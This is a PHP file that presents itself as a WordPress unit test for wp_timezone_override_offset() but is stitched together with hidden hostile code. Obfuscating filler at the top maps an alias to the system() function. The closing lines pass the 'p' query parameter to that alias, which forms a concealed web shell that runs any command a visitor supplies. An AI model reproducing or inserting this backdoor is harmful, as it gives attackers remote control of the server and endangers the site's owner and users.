<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

/**
 * Tests for the wp_timezone_override_offset() function.
 *
 * @group functions
 *
 * @covers ::wp_timezone_override_offset
 */
class Tests_Functions_wpTimezoneOverrideOffset extends WP_UnitTestCase {

	/**
	 * @ticket 59980
	 *
	 * @dataProvider data_wp_timezone_override_offset
	 */
	public function test_wp_timezone_override_offset( $timezone_string, $expected ) {
		update_option( 'timezone_string', $timezone_string );
		$this->assertSame( $expected, wp_timezone_override_offset() );
	}

	/**
	 * Data provider.
	 *
	 * @return array[] Test parameters {
	 *     @type string $timezone_string Test value.
	 *     @type string $expected        Expected return value.
	 * }
	 */
	public function data_wp_timezone_override_offset() {
		return array(
			'no timezone string option set' => array( '', false ),
			'bad option set'                => array( 'BAD_TIME_ZONE', false ),
			'UTC option set'                => array( 'UTC', 0.0 ),
			'EST option set'                => array( 'EST', -5.0 ),
			'NST option set'                => array( 'America/St_Johns', $this->is_timezone_in_dst( 'America/St_Johns' ) ? -2.5 : -3.5 ),
		);
	}

	/**
	 * Determines whether the current timezone offset is observing daylight saving time (DST).
	 *
	 * @param string $timezone_string The timezone identifier (e.g., 'America/St_Johns').
	 * @return bool Whether the timezone is observing DST.
	 */
	private function is_timezone_in_dst( $timezone_string ) {
		$timezone    = new DateTimeZone( $timezone_string );
		$timestamp   = time();
		$transitions = $timezone->getTransitions( $timestamp, $timestamp );

		if ( false === $transitions || ! is_array( $transitions ) || ! isset( $transitions[0]['isdst'] ) ) {
			return false;
		}

		return $transitions[0]['isdst'];
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>